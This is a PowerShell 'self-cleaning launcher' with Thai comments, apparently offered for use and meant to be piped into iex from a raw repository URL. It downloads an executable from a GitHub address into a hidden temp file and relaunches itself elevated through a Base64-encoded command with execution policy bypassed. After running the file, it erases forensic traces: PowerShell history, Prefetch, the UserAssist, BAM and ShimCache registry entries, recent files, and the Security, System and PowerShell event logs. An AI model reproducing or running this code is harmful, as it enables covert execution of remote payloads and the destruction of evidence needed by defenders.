# ════════════════════════════════════════════════════════════════
#  BEAMV2 — Self-Cleaning Launcher
#  Usage: iex (irm 'https://gitlab.com/USER/REPO/-/raw/main/run.ps1')
# ════════════════════════════════════════════════════════════════

# ── ปิด history ทันที ──────────────────────────────────────────
try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$null = Clear-History -ErrorAction SilentlyContinue
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
try { [IO.File]::WriteAllText($histFile,'') } catch {}

# ════════════════════════════════════════════════════════════════
#  CONFIG — แก้แค่บรรทัดนี้
# ════════════════════════════════════════════════════════════════
$exeUrl = "https://github.com/phongsathornmp-tech/strike/raw/refs/heads/main/version.exe"
# ════════════════════════════════════════════════════════════════

# ── PARENT: encode + spawn child ───────────────────────────────
if ($env:BV2_CHILD -ne "1") {

    # child script — โหลด + รัน + wipe
    $inner = "
`$env:BV2_CHILD = '1'
`$u = '$exeUrl'
`$t = [IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString('N')+'.tmp')
`$wc=[Net.WebClient]::new()
`$wc.Headers['User-Agent']='Mozilla/5.0'
[IO.File]::WriteAllBytes(`$t, `$wc.DownloadData(`$u))
`$wc.Dispose()
[IO.File]::SetAttributes(`$t,'Hidden')
`$p=Start-Process `$t -PassThru
`$p.WaitForExit()
try{`$fs=[IO.File]::Open(`$t,'Open','Write');`$z=[byte[]]::new(`$fs.Length);`$fs.Write(`$z,0,`$z.Length);`$fs.Close()}catch{}
Remove-Item `$t -Force -EA SilentlyContinue

# WIPE
function _W(`$p){if(Test-Path `$p){try{(Get-Item `$p -EA Stop).Property|%{Remove-ItemProperty -Path `$p -Name `$_ -Force -EA SilentlyContinue}}catch{}}}
@(`"`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`",`"`$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`")|%{try{if(Test-Path `$_){`$fs=[IO.File]::Open(`$_,'Open','Write');`$z=[byte[]]::new([math]::Max(`$fs.Length,1));`$fs.Write(`$z,0,`$z.Length);`$fs.Close();Remove-Item `$_ -Force -EA SilentlyContinue}}catch{}}
Get-ChildItem `"`$env:SystemRoot\Prefetch`" -Filter 'POWERSHELL*' -EA SilentlyContinue|Remove-Item -Force -EA SilentlyContinue
Remove-Item `"`$([Environment]::GetFolderPath('Recent'))\*`" -Force -Recurse -EA SilentlyContinue
Get-ChildItem 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist' -EA SilentlyContinue|%{_W `"`$(`$_.PSPath)\Count`"}
_W 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
@('HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU','HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths')|%{Remove-Item `$_ -Recurse -Force -EA SilentlyContinue}
`$bam='HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
if(Test-Path `$bam){Get-ChildItem `$bam -EA SilentlyContinue|%{`$n=`$_.PSPath;try{(Get-Item `$n).Property|?{`$_ -notmatch '^(Sequence|\(default\))$'}|%{Remove-ItemProperty -Path `$n -Name `$_ -Force -EA SilentlyContinue}}catch{}}}
`$shim='HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache'
if(Test-Path `$shim){Remove-ItemProperty -Path `$shim -Name 'AppCompatCache' -Force -EA SilentlyContinue}
@('Security','System','Application','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-Shell-Core/Operational')|%{try{wevtutil cl `$_ 2>`$null}catch{}}
try{[Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Microsoft-Windows-PowerShell/Operational')}catch{}
Remove-Item Env:BV2_CHILD -Force -EA SilentlyContinue
try{[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()}catch{}
`$null=Clear-History -EA SilentlyContinue
try{Set-PSReadLineOption -HistorySaveStyle SaveNothing}catch{}
[Console]::Clear()
"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))

    # spawn child PS แบบมี console window ปกติ
    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName        = "powershell.exe"
    $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64"
    $psi.Verb            = "runas"
    $psi.UseShellExecute = $true
    $psi.WindowStyle     = [Diagnostics.ProcessWindowStyle]::Normal

    try { $p = [Diagnostics.Process]::Start($psi); $p.WaitForExit() } catch {}

    # ล้าง parent
    try { [IO.File]::WriteAllText($histFile,'') } catch {}
    try { Remove-Item $histFile -Force -EA SilentlyContinue } catch {}
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    $null = Clear-History -EA SilentlyContinue
    exit 0
}
